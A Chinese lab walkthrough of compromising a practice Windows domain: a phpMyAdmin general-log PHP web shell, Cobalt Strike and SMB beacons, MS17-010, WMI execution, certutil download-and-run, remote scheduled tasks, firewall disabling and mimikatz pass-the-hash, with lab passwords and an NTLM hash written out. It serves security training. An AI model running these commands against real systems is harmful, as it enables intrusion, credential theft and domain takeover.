**0x01 前言**

之前在打一个域环境的时候出现了域内主机不出网的情况，当时用的是cs的socks代理将不出网主机的流量代理到了边缘主机上。当时没有考虑太多，下来之后想到搭一个环境复现一下当时的情况，看有没有更简便的方法能够打下不出网的主机。

机缘巧合之下，发现了这个域环境还不错，再复现的过程中也有一些知识触及了我的知识盲区，也收获了许多新的知识。特地把过程记录下来，与想要学习打域内不出网主机的师傅们共同分享。

**0x02 靶场地址分配**

内网网段：192.168.52.0/24

外网网段：192.168.10.0/24

**攻击机：**

kali：192.168.10.11

**靶场：**

win7(内)：192.168.52.143

win7(外)：192.168.10.15

**域内主机：**

Winserver2003：192.168.52.141

Winserver2008：192.168.52.138

- - - - - -

其中win7可以外网、内网通信，域内主机只能内网之间进行通信

![图片](https://shs3.b.qianxin.com/butian_public/f00d5306bce49c6930032cab242289fab.jpg)

![图片](https://shs3.b.qianxin.com/butian_public/fdbcb8acf4111cdffa658531320989e5e.jpg)

![图片](https://shs3.b.qianxin.com/butian_public/f445592be3c7223503bc0336b07d78f1b.jpg)

一开始DCping不通win7，win7关闭防火墙之后可以ping通

![图片](https://shs3.b.qianxin.com/butian_public/f4af12874e556a4fdfc1ce3302d5ba82d.jpg)

打开C盘下的phpstudy目录打开web服务

![图片](https://shs3.b.qianxin.com/butian_public/fa649cbfdb2158ad56a7a01ea0fc973f1.jpg)

**0x03 web服务器渗透**

**nmap探测端口**
------------

- 

```php
nmap -sS -P0 -sV -O 192.168.10.15
```

![图片](https://shs3.b.qianxin.com/butian_public/f79fc0a401f650c825a11fbab178301a4.jpg)

开了80端口，尝试访问web地址，发现为php探针

![图片](https://shs3.b.qianxin.com/butian_public/f4cec7b427838bfb6be85eb77ad41e4f9.jpg)

滑到最底部，发现网站底部有一个MySQL数据库连接检测

![图片](https://shs3.b.qianxin.com/butian_public/faa3079f77fa58a0d3782b4e67e529cc1.jpg)

弱口令`root/root`连接成功

![图片](https://shs3.b.qianxin.com/butian_public/fb88d8b5883919f091530fa5d7cf7b555.jpg)

**扫描后台**
--------

我这里用的是御剑，但是好像很拉，因为在我打完这个靶场之后再去网上看的时候发现他们很多扫出来一个cms，通过cms也能拿shell，这里我就不演示怎么用cms弱口令进后台写shell了，如果有感兴趣的小伙伴可以自行搜索一下

![图片](https://shs3.b.qianxin.com/butian_public/fb0511ae5a243088f32cf014e5bb7165e.jpg)

发现`phpmyadmin`目录，还是`root/root`弱口令登陆成功

![图片](https://shs3.b.qianxin.com/butian_public/f985683556a4a15818e0a2dbd3e510ef6.jpg)

进入后界面如下所示

![图片](https://shs3.b.qianxin.com/butian_public/f165c80e03f813f6ba137aa73f76cff6b.jpg)

**通过phpmyadmin写shell**
----------------------

通过phpmyadmin写shell有两种方式，首先我尝试select into outfile直接写入，但是他这里secure\_file\_priv的值为NULL，所以无法提权

![图片](https://shs3.b.qianxin.com/butian_public/f743cc9fc125d5840cab109c565a13d3c.jpg)

只能使用另外一种方法，用全局日志写shell

- 

```php
SHOW VARIABLES LIKE '%general%'
```

查看配置，可以看到全局日志是处于关闭的状态，`gengeral_log_file`返回了日志的绝对地址

![图片](https://shs3.b.qianxin.com/butian_public/ff458df59a59dc61a5692f80538295b80.jpg)

那这里我先把它的全局日志打开，再往它路径里面写入一个一句话木马

- 

```php
set global general_log = on;
```

![图片](https://shs3.b.qianxin.com/butian_public/fa6d84a4cf0ee3eb5ca89e95927fb3f9d.jpg)

开启全局日志后修改绝对路径，注意这里有一个坑，日志给我们返回的路径是`C:\\phpStudy\\MySQL\\data\\stu1.log`，但是mysql访问的绝对地址为`C:\\phpStudy\\WWW`目录下的文件，所以这个地方写shell必须要写到WWW目录下才能够用蚁剑连接上

- 

```php
set global general_log_file='C:\\phpStudy\\WWW\\shell.php';
```

![图片](https://shs3.b.qianxin.com/butian_public/f49b28447f592f42a48ad858c2bd66d9b.jpg)

这里再写入一句话木马

- 

```php
select '<?php eval($_POST[cmd]);?>'
```

![图片](https://shs3.b.qianxin.com/butian_public/fd8797d2e011d4d2c06809afb0364c009.jpg)

然后再上蚁剑连接即可

![图片](https://shs3.b.qianxin.com/butian_public/f4b3578b6a8770ae612d64f5e92a8cdf0.jpg)

可以看到连接成功

![图片](https://shs3.b.qianxin.com/butian_public/ff39ecad4571ebc6c7d919b870a58e597.jpg)

**0x04 内网信息搜集**

查看下系统的权限，一上来就是administrator权限就很舒服

![图片](https://shs3.b.qianxin.com/butian_public/ffa95947dd12c7601ac9834d7efed7a1b.jpg)

`ipconfig /all`查看网络信息，域环境+双网卡

![图片](https://shs3.b.qianxin.com/butian_public/feb39a62e35c2d96e20c135e62232d789.jpg)

![图片](https://shs3.b.qianxin.com/butian_public/ff8247378bdc8cae111e5e5556d8731f6.jpg)

`tasklist /svc`粗略看了一下，似乎是没有杀软的

![图片](https://shs3.b.qianxin.com/butian_public/f89c1c8500d768d3ab9ededeb8148bf69.jpg)

想着没有杀软，那么直接用最简单粗暴的上cs更省心，上传一个cs生成的木马exe到目标主机上

![图片](https://shs3.b.qianxin.com/butian_public/f6bb5b92a2c40b79dac27d8484d02f347.jpg)

用计划任务上线cs

![图片](https://shs3.b.qianxin.com/butian_public/fd8fe409461302cba43bfce8498d269d9.jpg)

成功上线

![图片](https://shs3.b.qianxin.com/butian_public/fad011ec08f8a4d8db347af696a85ea0f.jpg)

**0x05 内网渗透**

**信息搜集**

`net view`查看域信息

![图片](https://shs3.b.qianxin.com/butian_public/fcf44f823e89ca2b7e5927f3da580c489.jpg)

使用cs自带的端口扫描扫一波主机

![图片](https://shs3.b.qianxin.com/butian_public/f2d8e069e9ae43f7325ed71a50b0a6e88.jpg)

扫出来所有的主机如下

![图片](https://shs3.b.qianxin.com/butian_public/f934031d759288c13b010146d5557828c.jpg)

`hashdump`抓一波hash

![图片](https://shs3.b.qianxin.com/butian_public/faaff4852902a69e07dd2ef638bcc44e1.jpg)

`logonpasswords`抓一波明文

![图片](https://shs3.b.qianxin.com/butian_public/f2d3b62b72f1cd2682e8557fa85670855.jpg)

所有凭证如下，打码的原因是因为之前登陆的时候密码要重置，弄了一个带有个人信息的密码

![图片](https://shs3.b.qianxin.com/butian_public/f26fec5b57e7c583b7e726897a86a84fe.jpg)

**思路**

这里我测试了一下，因为目标主机没有开启防火墙，是能够通过cs自带的`psexec`一波横向抓域控和域内机器密码的，但是鉴于这个win7双网卡且域内另外主机不出网的情况，练习一下如何打不出网的主机

**不出网机器上线一般有以下几种方式：**

- 使用smb beacon
- 配置listener通过HTTP代理上线
- 使用pystinger搭建socks4代理

这里我使用`SMB beacon`这个方法

**SMB**

Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 `PsExec` 或 `Stageless Payload`上线

首先得到内网中一台主机的beacon，抓取密码后进行smb喷射，得到另一台开放445端口的机器上的administrator账户密码，在目标机器不出网的情况下，可以使用Smb beacon使目标主机上线

![图片](https://shs3.b.qianxin.com/butian_public/fa3a3a53090c0acf1c66b4ca24698583a.jpg)

**1.使用条件**

- 具有 SMB Beacon 的主机必须接受 445 端口上的连接。
- 只能链接由同一个 Cobalt Strike 实例管理的 Beacon。
- 利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。

**2.使用方法**

(1) 建立smb listener

![图片](https://shs3.b.qianxin.com/butian_public/f9b2d7f43d2597cecb1b1690141815b6a.jpg)

(2) 在cs中使用`psexec`进行横向移动，选择现有的beacon作为跳板，这里凭据必须是administrator，即拥有目标主机管理员权限

![图片](https://shs3.b.qianxin.com/butian_public/fb618793eb7ba2469b1e3b099ec79cfc9.jpg)

(3) 连接成功，可以看到`smb beacon`上线的主机右侧有∞∞标识

![图片](https://shs3.b.qianxin.com/butian_public/f148b0efb9f5d5587a26fe7e5bfbb8530.jpg)

使用这种方法上线的机器，主要是通过出网机作为一个中间人，不出网主机成功上线后，如果出网机一断开，这个不出网主机也会断

**0x06 内网横向渗透**

**思路**

用Ladon扫一波内网的永恒之蓝，发现这几台主机都存在MS17-010

![图片](https://shs3.b.qianxin.com/butian_public/fc1a82d69ad8249cd62dccf1fcf0af75b.jpg)

`ms17010`常见的几种打法：

- msf
- ladon/ladon\_ms17010
- 从msf分离出的exe
- nessus里的exe
- cs插件

这几种打法，我在这个环境中都做过尝试。过程就不一一叙述了，直接说我测试的结果

msf是最稳定的，但是打起来有稍许的麻烦因为要设置监听模块和选择攻击模块等配置。`ladon_ms17010`方便但是不太稳有时候会打不成功。cs插件也不稳，并且在这种不出网网络不稳定的情况下成功率会变的更低

在这种不出网的情况下，可以优先考虑使用从msf分离出的exe和`ladon_ms17010`来打，打成功会直接通过自定义的dll新建一个用户并加入管理员组，开启3389端口，而且还会留一个粘滞键后门

根据实际情况，可考虑在合适的时间段和条件下直接远程登入，翻一下敏感数据，往往会因为运维人员的很多“好习惯”而给渗透带来很多便利，比如说“密码本.txt”

**cs派生msf会话**

msf设置监听端口

![图片](https://shs3.b.qianxin.com/butian_public/f154754312a87a805f290405bfe67c61f.jpg)

cs新建端口建立对话

![图片](https://shs3.b.qianxin.com/butian_public/f1913cfb49856898be57d4e049be27894.jpg)

运行拿到meterpreter

![图片](https://shs3.b.qianxin.com/butian_public/f72df6605f85e142524e71651e4d0ddba.jpg)

**ms\_17\_010获取域控权限**

这里因为知道了DC是有`ms_17_010`这个漏洞的，所以我先尝试了用永恒之蓝打一波，使用如下模块

- 

```php
exploit/windows/smb/ms17_010_eternalblue
```

![图片](https://shs3.b.qianxin.com/butian_public/f956e3a5ff89c8d15e8a4496fce73e9ed.jpg)

运行之后发现exp已经打过去了但是没有session建立

![图片](https://shs3.b.qianxin.com/butian_public/ff9efc629d8c123d6330c65504ac5bc68.jpg)

再换个`ms17010`的模块

- 
- 

```php
use exploit/windows/smb/ms17_010_psexecset payload windows/meterpreter/bind_tcp
```

![图片](https://shs3.b.qianxin.com/butian_public/f05fbd541230b7ba7eb30b3ffbc7f1265.jpg)

同样没有拿到shell，当时没有细想，后来我考虑到可能是win7处于两个网段的原因，所以用永恒之蓝直接打是拿不到shell的

![图片](https://shs3.b.qianxin.com/butian_public/fb5457f787f9099bfc8b67fc77d8ebdb0.jpg)

**msf打不出网机器的ms\_17\_010**

想到之前拿到了win7的meterpreter，所以用添加路由的方式尝试一下。

msf在单兵作战的时候还是很稳定很香的。win7在msf上线后，因为我们已经提前知道了，存在52这个不出网的段，那么就需要在msf中添加路由

**1.查看路由**

- 

```php
run get_local_subnets
```

![图片](https://shs3.b.qianxin.com/butian_public/f1b7ec5d5ae66d6a42c49306b5e713713.jpg)

**2.添加路由**

- 

```php
run autoroute -s 192.168.52.0/24
```

![图片](https://shs3.b.qianxin.com/butian_public/f37fd51b3232e5f7756c8fc712eaed5e4.jpg)

**3.查看添加的路由**

- 

```php
run autoroute -p
```

![图片](https://shs3.b.qianxin.com/butian_public/fc0b98c1887c2d122b881b6b4a49f7ebd.jpg)

**4.开始攻击**

把shell切换到后台，再运用ms17\_010\_eternalblue模块

![图片](https://shs3.b.qianxin.com/butian_public/f5535c1c738027ddb491c7a5ec99e9307.jpg)

这次能够成功建立连接

![图片](https://shs3.b.qianxin.com/butian_public/f40bc41b06ff60b8e9e51d6bc9159e86b.jpg)

**ms\_17\_010模块总结**

**漏洞检测方法：**

设置一下目标ip和线程即可，这里因为已经扫出存在漏洞的机器了，所以就没有进行漏洞检测。

- 

```php
use auxiliary/scanner/smb/smb_ms17_010
```

**漏洞利用常使用的是：**

这里的第一个和第三个模块需要目标开启命名管道，并且比较稳定。第二个模块只要存在漏洞即可，但是会有概率把目标打蓝屏，而且杀软拦截也会比较严格，如果有杀软就基本可以放弃这个模块了。

- 
- 
- 

```php
auxiliary/admin/smb/ms17_010_commandexploit/windows/smb/ms17_010_eternalblueexploit/windows/smb/ms17_010_psexec
```

在打ms17010的时候，不妨使用`auxiliary/admin/smb/ms17_010_command`模块探测一下是否可以使用命名管道。

- 
- 
- 
- 
- 

```php
use auxiliary/admin/smb/ms17_010_commandset rhosts 192.168.164.156 192.168.164.161set command tasklistshow optionsrun
```

如果命令执行成功的话就可以优先考虑这两个模块进行利用

- 
- 

```php
auxiliary/admin/smb/ms17_010_commandexploit/windows/smb/ms17_010_psexec
```

**WMI获取域控服务器**

因为之前用了两个`ms_17_010`的模块都没有打成功，而session放在后台是后面才想到的打法，在当时模块没有打成功的情况下我决定另辟蹊径

首先我打开3389端口并关闭防火墙进到win7的远程桌面

**注册表开启3389端口**

- 

```php
REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

![图片](https://shs3.b.qianxin.com/butian_public/f3671eaf2a0fbfc82d0862151860c42b8.jpg)

**关闭防火墙**

- 
- 
- 
- 

```php
#windows server 2003之前netsh firewall set opmode disable #windows server 2003之后netsh advfirewall set allprofiles state off
```

这个时候防火墙是开启，关闭防火墙，使用域用户`god\\administrator/hongrisec@2020`成功登录这一台win7WEB主机

![图片](https://shs3.b.qianxin.com/butian_public/f3d8b3c9a87e1ab7daece7e386691212c.jpg)

上传`vmiexec.vbs`到192.168.52.143（win7）机器上，然后执行

- 

```php
cscript.exe vmiexec.vbs /cmd 192.168.52.138 administrator hongrisec@2020 "whoami"
```

因为我用vbs几次都没有回显，所以我这里使用的Ladon.exe，执行

- 

```php
Ladon.exe wmiexec 192.168.52.138 administrator hongrisec@2020 whoami
```

![图片](https://shs3.b.qianxin.com/butian_public/f60b00c76750adb21625e568fbf9d5117.jpg)

**同上面的过程一样，获取一个正向的msf连接，过程如下：**

首先生成一个正向的exe文件放到win7的网站目录上

![图片](https://shs3.b.qianxin.com/butian_public/f8b3d64700922640ea941d62ef9858575.jpg)

在win7上看一下，上传成功

![图片](https://shs3.b.qianxin.com/butian_public/f8709f82cdd9081e80c87b4579433afda.jpg)

在win7上使用WMI执行命令

- 

```php
certutil.exe -urlcache -split -f http://192.168.52.143/6666.exe&6666.exe
```

成功执行，这时候在138机器（即DC-win2008）上开启6666端口监听

在msf上个运行blin\_tcp来获取回话

![图片](https://shs3.b.qianxin.com/butian_public/f5fb6a0937f2b5fd06355ff1b1dd85b39.jpg)

成功获取域控权限，后续提权

![图片](https://shs3.b.qianxin.com/butian_public/f141305a103f664e58eed5a2a273be733.jpg)

使用`CVE-2018-8120`提权，成功提到系统权限，这里我思考了一下用`MS14-068`应该也能够提权成功

![图片](https://shs3.b.qianxin.com/butian_public/f6e3f7240ce85b3075d5648360394f99a.jpg)

成功提权，上免杀mimikatz，成功抓到hash

![图片](https://shs3.b.qianxin.com/butian_public/f03953737c3337f507e7a8be0f5e8adfd.jpg)

![图片](https://shs3.b.qianxin.com/butian_public/f324839a736571fd9d356d3be69e20e97.jpg)

**票据加计划任务获取DC**

这里先用msf的命令生成正向的马 `yukong.exe`

- 

```php
windows/reverse_bind_tcp LHOST=192.168.10.11 LPORT=7777
```

**``**

把马复制到域控机器上

- 

```php
shell copy C:\\yukong.exe \\192.168.52.138\\c$
```

**``**

然后再用这个写入计划任务的方法去连接，这里马反弹会连不成功，所以使用如下命令

- 

```php
shell schtasks /create /tn "test" /tr C:\\yukong.exe /sc once /st 22:14 /S 192.168.52.138 /RU System /u administrator /p "hongrisec@2020"
```

**``**

挂着win7代理

- 

```php
proxy nc -vv 192.168.52.138 7777
```

即可弹回DC的shell，然后清除计划任务

- 

```php
schtasks /delete /s 192.168.52.138 /tn "test" /f
```

使用mimikatz进行hash传递

- 

```php
mimikatz sekurlsa::pth /domain:god.org /user:administrator /ntlm:81be2f80d568100549beac645d6a7141
```

![图片](https://shs3.b.qianxin.com/butian_public/ff2a70561febadd7bb6b44fa057ea41b9.jpg)

查看DC的目录

- 

```php
shell dir \\192.168.52.138\\c$ //dir
```

![图片](https://shs3.b.qianxin.com/butian_public/fd007becc5fb4af00c4b0d1bee9f62f9c.jpg)

**0x07 后记**

当然最后获取域控权限的方法还有很多，如pth攻击、横向哈希传递、redis等等，而其中一些地方我用的方法也不是唯一方法，如通过扫描目录发现cms进入后台写shell，用代理将win7流量转出来的方法，都很值得学习。

通过这个靶场不仅锻炼了一些看过但是实战中不知道怎么使用的方法，也提升了自己独立解决问题的能力，也学到了很多新知识，如通过phpmyadmin写shell等等，用前辈说的话就是：低调求发展，潜心习安全。

文章授权转载于**“潇湘信安”**公众号